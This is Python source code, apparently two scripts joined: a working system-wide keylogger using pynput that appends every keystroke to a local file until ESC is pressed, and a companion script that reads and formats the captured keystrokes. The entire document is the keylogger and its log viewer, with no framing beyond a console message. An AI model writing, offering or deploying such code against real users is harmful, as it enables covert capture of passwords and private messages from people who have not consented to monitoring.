import os
from pynput import keyboard

# Define the local secure log file
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Capture alphanumeric keys
        k = key.char
    except AttributeError:
        # Capture special keys (e.g., space, enter, shift) and format them nicely
        k = f' [{key.name}] '
    
    # Append the keystroke to the local log file
    with open(LOG_FILE, "a") as f:
        f.write(k)

def on_release(key):
    # Stop the logger if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
print("Keylogger is running. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
import os

LOG_FILE = "keylog.txt"

def read_logs():
    if not os.path.exists(LOG_FILE):
        print("No log file found yet. Run the logger first.")
        return
        
    print("=== Captured Keystrokes ===\n")
    with open(LOG_FILE, "r") as f:
        content = f.read()
        # Pretty-print by replacing awkward key sequences
        readable_content = content.replace(" [space] ", " ").replace(" [enter] ", "\n")
        print(readable_content)

if __name__ == "__main__":
    read_logs()